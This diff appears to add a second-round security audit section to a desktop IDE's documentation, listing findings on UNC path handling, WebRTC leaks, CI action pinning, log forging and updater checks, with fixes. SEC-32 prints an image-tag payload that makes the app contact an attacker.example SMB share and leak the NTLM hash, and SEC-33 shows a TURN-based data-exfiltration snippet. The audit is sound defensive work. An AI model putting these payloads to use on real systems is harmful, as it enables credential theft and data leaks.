@@ -14,7 +14,8 @@ Run them from a cwd on an uppercase drive letter (a lowercase `c:\` breaks vites
 
 **Counts:** 2 critical, 5 high, 9 medium, 11 low. A follow-up scan of the fixes added 1 high and
 3 medium (SEC-28..31, fixed). `pnpm audit --prod` reports no known
-vulnerabilities.
+vulnerabilities. [Round 2](#round-2-2026-11-25) (2026-11-25) found 3 medium and 8 low
+(SEC-32..42); the mediums and five lows are fixed.
 
 ## Critical
 
@@ -585,6 +586,177 @@ as defence in depth. A custom model's base URL must be `http(s)` without `user:p
 (refused at save time), and the dialog shows `new URL(baseUrl).origin` in full on its own
 `Endpoint:` line before anything else. Files: `security/confirm.ts`, `handlers/settings.ts`,
 `services/extensions.ts`.
+
+## Round 2 (2026-11-25)
+
+A second adversarial pass over everything merged since round 1: extension UI contributions
+(`oide-ext://`, panel iframes and the postMessage bridge, extension settings, themes, techniques,
+deploy targets, artifact types), the artifact editors (Excalidraw, Monaco, rename, delete,
+version compare, `baseVersion` conflicts, `artifacts.changed`), reliability (crash recovery,
+error reports, rotating redacted logs, crash reporter, DB recovery, cleanup queue, Diagnostics,
+`app.*`), the updater, the release and CI workflows with `tools/fake-claude/record.mjs`,
+`settings.forProject`, the custom-model env allow-list, `safeDialogText` and the keymap. Every
+IPC command added since round 1 (`app.*`, `updates.*`, `dialog.pickCli`, `settings.forProject`,
+`extensions.uiUrl`/`panelMessage`/`settings`/`setSetting`/`runDeployTarget`, `artifacts.rename`,
+`artifacts.save` with `baseVersion`, `review.addComment` with `side`) was checked against
+`packages/protocol/src/ipc.ts` for validation, path guards and native confirmation. In this round
+the reviewer also fixed what it found. The PoC tests are `test/security/round2-*.test.ts`; each one
+failed before its fix (shown for SEC-32 and SEC-33 against the real code and Electron 45).
+
+**Counts:** 0 critical, 0 high, 3 medium, 8 low. All mediums are fixed; 5 lows are fixed and 3
+are accepted or documented.
+
+**Regression check:** every round-1 PoC still passes on merged main (`test/security/*.test.ts`,
+no `it.fails` left). Spot checks of the code paths found no merge damage: SEC-01
+(`early-env.ts` is still the first import of `index.ts`; `buildLaunch` sets the env var),
+SEC-02 (`--setting-sources user --strict-mcp-config` for untrusted launches), SEC-03 (`Git.run`
+trust resolver and overrides), SEC-05 (`terminal.create` strict schema, project/worktree roots),
+SEC-08 (`ProjectsService.mayOpen` before any git), SEC-16 (`${OIDE_MCP_HANDSHAKE}` placeholders),
+SEC-28 (`MODEL_ENV_ALLOW_LIST` and value checks), plus the window flags, the IPC sender check and
+`hardenApp`.
+
+### SEC-32 (medium) Preview and panel URLs can make main open a UNC path (NTLM hash leak)
+
+- **Attack:** `resolveArtifactUrl` and `resolveExtensionUrl` decode the URL path and call
+  `realpathSync(resolve(dir, rel))` before checking that the result sits inside the folder.
+  `%5C` decodes to `\`, so `<img src="/%5C%5Cattacker.example%5Cshare%5Cx.png">` in an untrusted
+  repo's design artifact (`img-src 'self'` allows it) makes main resolve
+  `\\attacker.example\share\x.png`. On Windows that is an outbound SMB connection carrying the
+  user's NTLM hash, and `\Windows\…`-style paths give a file-existence oracle for the whole disk.
+  The same works from any extension panel and from a dev-server page inside the Browser preview
+  panel. Checked on Electron 45: Chromium hands `oide-artifact://a1/%5C%5Cattacker.example%5C…`
+  to the protocol handler unchanged.
+- **PoC:** `test/security/round2-protocol-paths.test.ts` (spies on `realpathSync`/`statSync`).
+- **Status:** **fixed.** Both resolvers refuse a backslash in the decoded path and anything not
+  lexically inside the folder before the file system is touched; the realpath checks stay as the
+  second line. Files: `services/core.ts`, `services/extension-ui.ts`.
+
+### SEC-33 (medium) WebRTC still reaches the network from previews and panels (SEC-18 incomplete)
+
+- **Attack:** SEC-18 set `disable_non_proxied_udp`, which only removes UDP. On Electron 45 a
+  sandboxed iframe running `new RTCPeerConnection({ iceServers: [{ urls:
+  'turn:<host>:443?transport=tcp', username: '<data>' }], iceTransportPolicy: 'relay' })` opened
+  TCP connections to the TURN host (5 connections to a listener on a LAN address in the
+  experiment). CSP does not cover WebRTC (`connect-src 'none'` and even `webrtc 'block'` had no
+  effect). So an untrusted repo's design artifact or any extension panel could send what it shows
+  (artifact content, panel data) to any host, despite "no network at all".
+- **PoC:** `test/security/round2-network.test.ts`; the Electron experiment is described there.
+- **Status:** **fixed.** `hardenApp` gives the default session (app window, previews, panels; the
+  updater uses its own `electron-updater` session) a fixed proxy that does not exist
+  (`NO_NETWORK_PROXY`, `http://127.0.0.1:9`, no direct fallback). The same experiment then saw 0
+  connections to the LAN address, while loopback (dev server, Browser preview's localhost frames)
+  stays direct because Chromium bypasses loopback implicitly. Nothing the window shows may load
+  remote content anyway (CSP). Residual: `<link rel="dns-prefetch">` was not tested. Files:
+  `security/hardening.ts`, `index.ts` (awaits it).
+
+### SEC-34 (medium) Workflows use third-party actions by tag; release builds restore a cache
+
+- **Attack:** every workflow used `pnpm/action-setup@v4`, `actions/*@v4` and
+  `github/codeql-action/*@v3`. The release job has `contents: write` and the signing secrets in its
+  later steps' env; a re-pointed tag (hijacked maintainer account) runs in that job before them and
+  can replace the toolchain, then sign and upload a backdoored installer that auto-update offers.
+  The release jobs also restored the pnpm store from the Actions cache. No workflow uses
+  `pull_request_target` or `workflow_run`, no `run:` step expands `github.event.*` or
+  `github.head_ref`, the self-hosted jobs run only on schedule or dispatch, and `record.mjs` runs
+  the CLI with the allow-listed env and reads no credential file (all checked, all fine).
+- **PoC:** `test/security/round2-workflows.test.ts`.
+- **Status:** **fixed.** Every `uses:` is pinned to a commit SHA with a `# vN` comment (Dependabot's
+  `github-actions` ecosystem keeps both current), and release jobs no longer use `cache: pnpm`.
+  Files: `.github/workflows/*.yml`.
+
+### SEC-35 (low) Renderer error reports can forge log entries and flood the log
+
+`app.reportError` writes the renderer's `screen`, message and stack (about 18 KB, no rate limit),
+and the logger kept their line breaks, so a report could add lines that look like real entries
+(`2026-… ERROR [main] …`) in a log a user pastes into an issue. The formatter also printed only
+`stack` for any object that had one, dropping the report's name and message.
+**Status:** **fixed.** Continuation lines (`\n`, `\r`, U+0085, U+2028, U+2029) are indented, so only
+real entries start in column 0; only `Error` instances print as their stack; at most 20 reports a
+minute are written. Files: `reliability/{logger,redact}.ts`, `handlers/app.ts`. PoC:
+`round2-logs.test.ts`.
+
+### SEC-36 (low) Untrusted project techniques can ride on a default-on technique id
+
+A launch picks techniques by id, and `forProject` appended the repo's `.oide/techniques.json`
+without checking ids. A technique reusing `review` (on by default) or an extension's
+`ext:<name>:<id>` reached every agent's first message, although untrusted project techniques are
+meant to start off. **Status:** **fixed.** `forProject` drops project techniques whose id is a
+global one or starts with `ext:`. File: `packages/store/src/settings.ts`. PoC: `round2-misc.test.ts`.
+
+### SEC-37 (low) `safeDialogText` missed characters that render as nothing
+
+Soft hyphen, combining grapheme joiner, Hangul and Khmer fillers, Mongolian separators, deprecated
+format characters, variation selectors, interlinear annotation marks and the tag block
+(U+E0000…, an invisible copy of any ASCII text) passed through. **Status:** **fixed.** All are shown
+as `\u{…}` escapes. File: `security/confirm.ts`. PoC: `round2-misc.test.ts`.
+
+### SEC-38 (low) The trust dialog showed the folder name and path unescaped
+
+"Do you trust the files in …?" took the folder name and path as they were; a folder from a zip, or
+any folder on macOS/Linux, can contain newlines or U+202E and fake another project's name or path.
+**Status:** **fixed.** `trustPromptText` escapes both with `safeDialogText`. Files:
+`security/confirm.ts`, `services/electron-platform.ts`. PoC: `round2-misc.test.ts`.
+
+### SEC-39 (low) The renderer path guard realpaths UNC candidates
+
+`isInside` realpaths the renderer's candidate before comparing it with the roots, so a compromised
+renderer naming `\\host\share\x` in `files.*` made main connect to that host. **Status:**
+**fixed.** On Windows a UNC or device candidate under a non-UNC root is refused first. File:
+`security/paths.ts`. PoC: `round2-protocol-paths.test.ts`.
+
+### SEC-40 (low) Unsigned Windows builds install updates without a publisher check
+
+electron-updater checks the installer's Authenticode publisher only when `app-update.yml` names one,
+which happens only for signed builds (`AZURE_SIGNING_PUBLISHER` or a certificate). Unsigned
+releases rely on the sha512 in `latest.yml` from the same GitHub release over HTTPS, so whoever can
+publish a release can ship any installer. Downgrades stay off (`allowDowngrade` is reset after
+every channel change), downloads and installs need clicks, and unsigned macOS builds cannot install.
+**Status:** **accepted** for unsigned betas; sign stable releases (see [packaging](packaging.md)).
+
+### SEC-41 (low) An artifact viewer can pass an artifact to its own panels
+
+An extension's artifact viewer gets the artifact's content even in a project where the extension
+is off, and although viewers never reach host code, the viewer can `postMessage` it to a sibling
+panel frame of the same extension, which forwards it to host code. That sidesteps SEC-23's
+`artifacts.read` scoping. **Status:** **accepted.** Host code has full Node as the user (SEC-14)
+and can read `.oide/artifacts/` from disk anyway; the viewer is only shown for artifacts whose
+`type` names that extension.
+
+### SEC-42 (low) Opt-in CLI compatibility recordings are uploaded as workflow artifacts
+
+The self-hosted `cli-compat` session job (off unless `OIDE_CLI_COMPAT_SESSION` is set) uploads its
+sanitized recording. Paths, ids, emails and tokens are replaced, but the CLI's `init` event still
+lists the runner owner's MCP server, plugin, skill and agent names, readable by anyone who can read
+the repository's Actions artifacts. **Status:** **documented;** check a recording before turning
+the job on.
+
+### Round 2: what held
+
+- **Panel isolation:** frames are `sandbox="allow-scripts"` (opaque origin, no `window.oide`, no
+  top navigation, popups or forms); the bridge accepts a message only from a registered frame's own
+  `contentWindow` and forwards it under that frame's extension and panel id, so a panel cannot
+  speak as another extension; siblings cannot navigate each other (sandboxed navigation flag), and
+  a nested localhost page cannot reach the bridge or navigate its panel. Main checks the extension
+  is on, the panel id and the size again. `oide-ext://` serves only the extension's own real files
+  (`..`, `%2e%2e`, case, trailing dots, `:` streams, dot files, `node_modules`, symlinks out, unknown
+  types all 404), origins are hashes of the name, panel CSP has `connect-src 'none'`, `'self'`
+  scripts only and no frames except loopback for extensions that declare it.
+- **Contributions:** themes set only four CSS variables to `#rrggbb`; extension techniques are off
+  by default and only for extensions on in that project; setting descriptions are text; secret
+  settings never cross IPC; deploy targets run only through `runDeployTarget` with a checked agent.
+- **Artifact editors:** Markdown through DOMPurify; unsaved or older design versions in
+  `srcdoc` with an empty sandbox (no scripts); Excalidraw with embeds off and links only through
+  the main-side allow-list; Monaco models are text; saves are serialised per artifact and
+  `baseVersion` conflicts are refused in main; rename changes only the title (the folder slug
+  stays), and delete removes only the indexed folder (`rm` does not follow a symlinked folder).
+- **Reliability:** logs, crash summaries and Diagnostics go through the Redactor (keychain reads,
+  agent MCP secrets and secret env are registered); crash reports are off by default and never
+  uploaded; the cleanup queue only holds worktree paths main scheduled (a process able to write
+  userData already controls oIDE's database).
+- **Updater:** no auto-download or auto-install, install needs `consent: true`, prerelease only on
+  beta, downgrades off, release notes reduced to plain text, its own session.
+- **Settings:** `settings.forProject` applies the default mode only for trusted projects and never
+  bypass unless allowed; custom model env allow-list and value checks unchanged.
 
 ## What held
 
